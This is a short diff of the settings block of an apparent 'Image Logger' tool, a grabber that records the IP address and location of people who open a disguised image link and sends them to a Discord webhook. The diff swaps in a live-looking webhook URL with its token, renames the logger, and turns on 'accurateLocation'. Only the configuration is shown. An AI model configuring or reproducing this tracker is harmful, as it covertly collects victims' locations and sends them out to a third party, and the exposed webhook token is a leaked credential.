@@ -10,15 +10,15 @@ __version__ = "v2.0"
 __author__ = "channelsbecausewhy"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1411024684031672532/af16IhoiWJdUOxU7AmY66HpOzjU_XD4w8TR86DASRfoQQdBuQLDxGpq2T1I1vPl-9r7d",
+    "webhook": "https://discord.com/api/webhooks/1411029142912241745/-1Wd_3Jhz-BiJhJeQP4Nr1m_YSSQZEsTjVymmx62c8vWDi9xOqPpnIXYdKjA1O8J63Ua",
     "image": "https://link-to-your-image.here", 
     "imageArgument": True,
 
-    "username": "CABDIOLOGGER", 
+    "username": "Image Logger", 
     "color": 0x00FFFF,
 
     "crashBrowser": False, 
-    "accurateLocation": False,
+    "accurateLocation": True,
 
     "message": {
         "doMessage": False, 
